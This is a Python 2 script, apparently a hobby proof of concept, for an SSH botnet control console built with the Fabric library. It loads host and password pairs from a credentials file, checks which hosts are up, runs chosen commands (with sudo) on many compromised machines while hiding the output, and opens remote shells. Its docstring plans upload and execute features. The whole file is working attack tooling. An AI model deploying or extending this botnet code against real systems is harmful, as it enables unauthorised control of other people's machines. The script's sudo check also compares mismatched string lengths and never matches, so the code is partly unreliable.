#!/usr/bin/python
"""
Inspired by: http://raidersec.blogspot.ie/2013/07/building-ssh-botnet-c-using-python-and.html
Simply executes commands on "all" or "individual" hosts from a list for now
Later I plan on adding upload, download, upload/execute, and hardcoded 
'botnet like features' as a proof of concept.
This initial version is entirely based on the above blog post code, just 
some minor edits for now.
"""
from fabric.api import *

def fill_hosts():
    for line in open('creds.txt','r').readlines():
        host, passw = line.split()
        env.hosts.append(host)
        env.passwords[host] = passw

def run_command(command):
    try:
        with hide('running', 'stdout', 'stderr'):
            if command.strip()[0:5] == "sudo":
                results = sudo(command)
            else:
                results = run(command)
    except:
        results = 'Error'
    return results

PROMPT = "Commander > "
env.hosts = []
running_hosts = {}
 
def list_hosts():
    print "\n{0:5} | {1:30} | {2:15}".format("ID", "Host", "Status")
    print "-" * 40
    for idx, host in enumerate(env.hosts):
        print "{0:5} | {1:30} | {2}".format(idx, host, running_hosts[host])
    print "\n"

def check_hosts():
    ''' Checks each host to see if it's running '''
    for host, result in execute(run_command, "uptime", hosts=env.hosts).iteritems():
        running_hosts[host] = result if result.succeeded else "Host Down"

def get_hosts():
    selected_hosts = []
    for host in raw_input("Hosts (eg: 0 1): ").split():
        selected_hosts.append(env.hosts[int(host)])
    return selected_hosts
 
def menu():
    for num, desc in enumerate(["List Hosts", "Run Command", "Open Shell", "Exit"]):
        print "[" + str(num) + "] " + desc
    choice = int(raw_input('\n' + PROMPT))
    while (choice != 3):
        list_hosts()
        # If we choose to run a command
        if choice == 1:
            cmd = raw_input("Command: ")
            # Execute the "run_command" task with the given command on the selected hosts
            for host, result in execute(run_command, cmd, hosts=get_hosts()).iteritems():
                print "[" + host + "]: " + cmd
                print ('-' * 80) + '\n' + result + '\n'
        # If we choose to open a shell
        elif choice == 2:
            host = int(raw_input("Host: "))
            execute(open_shell, host=env.hosts[host])
        for num, desc in enumerate(["List Hosts", "Run Command", "Open Shell", "Exit"]):
            print "[" + str(num) + "] " + desc
        choice = int(raw_input('\n' + PROMPT))
        
if __name__ == "__main__":
    fill_hosts()
    check_hosts()
    menu()
